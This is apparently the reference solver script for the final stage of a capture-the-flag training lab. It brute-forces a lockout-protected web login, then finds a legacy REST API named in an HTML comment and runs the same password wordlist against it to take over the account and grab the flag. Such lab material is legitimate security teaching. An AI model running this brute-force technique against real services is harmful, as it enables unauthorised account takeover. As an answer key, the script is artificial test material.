#!/usr/bin/env python3
"""Operation 06 reference solver — Nomad flanks Kaid through the forgotten API.

This is the finale, and it's deliberately run in two parts so you SEE the lesson,
not just read about it:

  Part 1 -- attack the hardened WEB login with the provided wordlist. It gets
  locked out almost immediately (well before the real password's position in the
  list), proving the web hardening genuinely works this time.

  Part 2 -- discover the legacy REST API (a leftover dev comment in the web
  login's HTML source names it, exactly like Operation 05 taught you to look),
  then run the EXACT SAME wordlist against it. No lockout there at all -- it
  walks straight through.

Usage: python3 op6.py [base_url]     (default http://localhost:8000)
"""
import sys, os, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "g.mendel"
WORDLIST = os.path.join(os.path.dirname(__file__), "..", "wordlists", "op6_passwords.txt")


def load_wordlist():
    return [l.strip() for l in open(WORDLIST) if l.strip()]


def attack_web_login(passwords):
    print("[*] Part 1: attacking the HARDENED web login with the wordlist")
    sess = requests.Session()
    for i, pw in enumerate(passwords, 1):
        r = sess.post(f"{BASE}/op6/login", data={"username": USER, "password": pw})
        if r.status_code == 423:
            print(f"[!] LOCKED OUT after {i}/{len(passwords)} tries — real lockout, no bypass")
            print(f"    (the real password sits later in the list — the web channel is safe)")
            return
        if r.status_code == 302:
            print(f"[+] (unexpected) web login succeeded at try {i}: {pw}")
            return
    print("[!] exhausted the list without locking out or succeeding — did the app change?")


def discover_api_path():
    print("\n[*] Part 2: view-source the web login, looking for a leftover comment")
    r = requests.get(f"{BASE}/op6/")
    m = re.search(r"hits\s+(/api/\S+)\s+directly", r.text)
    if not m:
        print("[!] couldn't find the leftover dev comment -- has the page changed?")
        return None
    path = m.group(1)
    print(f"[*] found it: a legacy client still hits {path} directly")
    return path


def attack_api(api_path, passwords):
    print(f"\n[*] running the SAME wordlist against {api_path} -- no lockout this time")
    sess = requests.Session()
    for i, pw in enumerate(passwords, 1):
        r = sess.post(f"{BASE}{api_path}", json={"username": USER, "password": pw})
        body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
        if body.get("success"):
            print(f"[+] CRACKED at try {i}/{len(passwords)}: {USER}:{pw}")
            console = sess.get(f"{BASE}{body.get('next', '/op6/console')}")
            flag = re.search(r"R6S\{[^}]*\}", console.text)
            if flag:
                print(f"[+] FINAL FLAG: {flag.group(0)}")
                print("[+] Campaign complete.")
            return
    print("[!] exhausted the list against the API without success")


def main():
    passwords = load_wordlist()
    attack_web_login(passwords)
    api_path = discover_api_path()
    if api_path:
        attack_api(api_path, passwords)


if __name__ == "__main__":
    main()
